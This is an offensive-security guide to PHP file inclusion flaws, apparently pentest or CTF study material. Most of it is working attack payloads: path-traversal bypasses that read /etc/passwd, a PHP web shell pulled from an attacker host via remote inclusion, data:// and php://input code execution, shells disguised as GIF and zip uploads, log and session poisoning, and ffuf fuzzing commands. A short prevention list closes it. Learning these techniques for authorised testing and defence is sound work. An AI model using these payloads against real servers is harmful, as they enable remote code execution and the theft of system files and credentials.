File Inclusion Vulnerabilities – Complete Guide

A thorough walkthrough of Local File Inclusion (LFI), Remote File Inclusion (RFI), exploitation techniques, bypasses, and prevention.

---

## 1. What is File Inclusion?

Modern web applications often use dynamic file inclusion to load content (e.g., ?page=about). If user input is unsafely passed to an inclusion function (like include() in PHP), an attacker can force the server to load arbitrary files.

Common vulnerable functions (PHP)

| Function          | Reads content | Executes PHP | Allows remote URLs |
|-------------------|---------------|--------------|---------------------|
| include()         | ✅            | ✅           | ✅                  |
| require()         | ✅            | ✅           | ❌                  |
| file_get_contents()| ✅           | ❌           | ✅                  |
| fopen() / file()  | ✅            | ❌           | ❌                  |

Key distinction: Some functions only read files; others execute PHP code. For RCE we need execute privileges.

---

## 2. Local File Inclusion (LFI)

LFI allows reading local files on the server.

Basic LFI
http://target/index.php?language=../../../../etc/passwd

Bypasses for common filters

a) Non-recursive ../ removal
If the app does str_replace('../', '', $input) only once, use:
....//....//....//etc/passwd
The filter removes the inner ../, leaving ../../etc/passwd.

b) URL encoding
If . and / are blocked, encode the payload:
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

c) Double encoding (for filters that decode once)
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

d) Using an approved prefix
If the app only includes files under ./languages/, break out:
./languages/../../../../etc/passwd

e) Null byte (PHP < 5.5) – to cut appended extensions
../../../../etc/passwd%00

f) Query string trick – for appended .php
../../../../etc/passwd?

---

## 3. Remote File Inclusion (RFI)

If allow_url_include = On in php.ini, we can include remote files.

Check RFI
http://target/index.php?language=http://127.0.0.1/index.php
If the page content appears, RFI works.

RCE via RFI

1. Host a PHP web shell on your machine:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80

2. Include your shell and execute commands:
http://target/index.php?language=http://YOUR_IP/shell.php&cmd=id

Alternative protocols
FTP: ftp://YOUR_IP/shell.php
SMB (Windows targets): \\YOUR_IP\share\shell.php – no allow_url_include needed.

---

## 4. PHP Wrappers for LFI to RCE

a) PHP Filter – read source code
Encode files to Base64 to avoid execution:
php://filter/read=convert.base64-encode/resource=config
Decode:
echo 'BASE64_STRING' | base64 -d

b) data:// wrapper – direct code execution (requires allow_url_include = On)
Encode your PHP code in Base64 and include it:
echo '<?php system($_GET["cmd"]); ?>' | base64
Payload:
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id

c) php://input – POST-based code execution
curl -X POST --data '<?php system("id"); ?>' \
  "http://target/index.php?language=php://input"

d) expect:// wrapper – direct command execution (if extension loaded)
http://target/index.php?language=expect://id

---

## 5. File Upload + LFI

Combine a file upload form with an LFI vulnerability.

a) Malicious image (GIF)
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
Upload as avatar/profile image. Then include it:
http://target/index.php?language=./profile_images/shell.gif&cmd=id

b) Zip wrapper
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
Upload shell.jpg, then:
zip://./profile_images/shell.jpg%23shell.php&cmd=id

c) Phar wrapper
Create a PHAR file, rename to .jpg, upload, include with phar://.

---

## 6. Log Poisoning

If you can write PHP code into logs (e.g., User-Agent) and then include the log, you get RCE.

a) Session poisoning
Get your PHPSESSID cookie.
Poison session file by visiting:
http://target/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
Include the session file (Linux: /var/lib/php/sessions/sess_<COOKIE>) and execute commands.

b) Apache/Nginx access log poisoning
Check if you can read the log:
http://target/index.php?language=/var/log/apache2/access.log
Send a request with a malicious User-Agent:
curl -s "http://target/" -A "<?php system(\$_GET['cmd']); ?>"
Include the log and execute:
http://target/index.php?language=/var/log/apache2/access.log&cmd=id

---

## 7. Automated Scanning

Use ffuf to quickly discover LFI parameters and payloads.

Fuzz for parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://target/index.php?FUZZ=test' -fs <BASELINE_SIZE>

Fuzz for LFI payloads
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://target/index.php?language=FUZZ' -fs <BASELINE_SIZE>

Find webroot
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u 'http://target/index.php?language=../../../../FUZZ/index.php' -fs <BASELINE_SIZE>

Find configuration/log files
Use a dedicated Linux LFI wordlist to discover /etc/passwd, logs, and configs.

---

## 8. Real-world Exploitation Chain (Example)

1. Discover LFI – e.g., /api/image.php?p=....//....//....//....//etc/passwd works.
2. Find file upload – /apply.php accepts any file.
3. Upload PHP shell – shell.php stored as /uploads/<MD5>.php.
4. Find executable LFI – e.g., /contact.php?region=... with weak filtering.
5. Bypass filter – use double URL encoding to pass ../ and / checks.
6. Include uploaded shell – ?region=%252E%252E%252Fuploads%252F<hash>&cmd=id.
7. List root – &cmd=ls%20/ → find flag_XXX.txt.
8. Read flag – &cmd=cat%20/flag_XXX.txt.

---

## 9. Prevention

- Never pass user input directly to inclusion functions.
- Use whitelists – map user input to predefined files.
- Use basename() to strip paths.
- Recursively remove ../ patterns.
- Disable RFI – set allow_url_fopen and allow_url_include to Off.
- Restrict filesystem with open_basedir.
- Disable dangerous modules like expect.
- Use a WAF (e.g., ModSecurity) and monitor logs.

---

## 10. Quick Reference Table

| Attack | Key Requirement | Payload Example |
|--------|------------------|------------------|
| Basic LFI | Inclusion function | ?file=../../../../etc/passwd |
| LFI with ....// bypass | Non-recursive ../ removal | ?file=....//....//....//etc/passwd |
| URL-encoded LFI | Filter on . and / | ?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd |
| Double-encoded LFI | urldecode() after filter | ?file=%252e%252e%252fetc%252fpasswd |
| PHP filter read | LFI + filter support | ?file=php://filter/.../resource=config |
| data:// RCE | allow_url_include = On | ?file=data://text/plain;base64,<BASE64>&cmd=id |
| php://input RCE | allow_url_include = On, POST | curl -X POST --data '<?php system("id");?>' ... |
| expect:// RCE | expect extension loaded | ?file=expect://id |
| Log poisoning | Readable log + LFI | Inject User-Agent, then include log |
| Upload + LFI | File upload form + LFI | Upload .gif with PHP code, include it |
| Zip wrapper | zip wrapper enabled | ?file=zip://./uploads/shell.jpg%23shell.php&cmd=id |

Final note: Always test manually – automated tools help, but custom bypasses often require creative thinking.
